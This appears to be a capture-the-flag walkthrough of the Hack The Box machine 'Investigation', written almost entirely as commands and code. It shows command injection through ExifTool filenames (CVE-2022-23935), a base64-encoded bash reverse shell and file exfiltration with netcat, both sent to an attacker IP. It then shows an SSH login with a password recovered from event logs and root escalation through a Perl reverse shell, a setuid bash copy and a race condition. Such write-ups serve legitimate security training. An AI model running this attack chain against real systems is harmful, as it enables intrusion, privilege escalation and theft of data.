## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB

---

## 🔍 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.197
nmap -p 22,80 -sCV 10.10.11.197
```
- Open Ports: 22 [SSH](SSH), 80 [HTTP](HTTP)
- Redirects to: `http://eforenzics.htb/`

### Hosts File
```
10.10.11.197 eforenzics.htb
```

### Feroxbuster
```bash
feroxbuster -u http://eforenzics.htb -x php,html
```
- Found: `/upload.php`, `/service.html`, various assets

---

## 💻 Shell as www-data

### CVE-2022-23935 - ExifTool Filename Injection
- ExifTool version: 12.37
- Exploit by setting filename to a command ending in `|`

### Example Payload:
```bash
filename: ping -c 1 10.10.14.6|
```
Confirm RCE using tcpdump or Burp.

### Reverse Shell
```bash
# Encode reverse shell to avoid special chars
echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0

# Upload using filename set to: bash -c {echo,<base64>}|base64 -d|bash|
```
Receive with netcat:
```bash
nc -lnvp 443
```

### Shell Upgrade
```bash
script /dev/null -c bash
<Ctrl-Z>
stty raw -echo; fg
reset
```

---

## 👤 Shell as smorton

### Find Sensitive Files
```bash
find / -user smorton 2>/dev/null
```
Found: `/usr/local/investigation/Windows Event Logs for Analysis.msg`

### Crontab
```bash
crontab -l
```
Contains cleanup script, broken by immutable log file `analysed_log`.

### Exfiltrate `.msg`
```bash
nc -lnvp 443 > analysis.msg
cat analysis.msg | nc 10.10.14.6 443
```

### Analyze Email
```bash
msgconvert analysis.msg --mbox analysis.mbox
mutt -f analysis.mbox
# Save attachment: evtx-logs.zip
unzip evtx-logs.zip
```

### Convert EVTX to JSONL
```bash
evtx_dump security.evtx -o jsonl -t 1 -f security.json
```

### JQ Analysis
- Identify failed login with password in username field:
```bash
jq -r 'select(.Event.System.EventID==4625) | .Event.EventData.TargetUserName' security.json
```
Found password: `Def@ultf0r3nz!csPa$$`

### SSH as smorton
```bash
sshpass -p 'Def@ultf0r3nz!csPa$$' ssh smorton@eforenzics.htb
```

---

## 🧠 Shell as root

### Sudo Access
```bash
sudo -l
```
Can run: `/usr/bin/binary` as root

### Binary Behavior
- Downloads file from URL (arg1)
- Saves as `lDnxUysaQn` (arg2)
- Runs with: `perl ./lDnxUysaQn`
- Cleans up the file

### Option 1: Perl Reverse Shell
```perl
use Socket;
$i="10.10.14.6";$p=443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("sh -i");
}
```
Run:
```bash
sudo binary http://10.10.14.6/shell.pl lDnxUysaQn
```

### Option 2: Bash with Shebang
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
```
Run:
```bash
sudo binary http://10.10.14.6/root.sh lDnxUysaQn
/tmp/rootbash -p
```

### Option 3: Race Condition
```bash
# One terminal:
while :; do if [ -f lDnxUysaQn ]; then mv -f lDnxUysaQn garbage; cp -f 0xdf.sh lDnxUysaQn; sleep 1; rm lDnxUysaQn; fi; done

# Second terminal:
sudo binary http://10.10.14.6/race lDnxUysaQn
```

---

## 🏁 Flags
- User: `fe330173************************`
- Root: `e9f2ff77************************`

---

## 🧩 Notable Tools Used
- [ExifTool](https://exiftool.org/)
- [evtx_dump](https://github.com/omerbenamram/evtx)
- [mutt](http://www.mutt.org/), [msgconvert](https://metacpan.org/pod/distribution/Email-Outlook-Message/bin/msgconvert)
- [jq](https://stedolan.github.io/jq/), [feroxbuster](https://github.com/epi052/feroxbuster)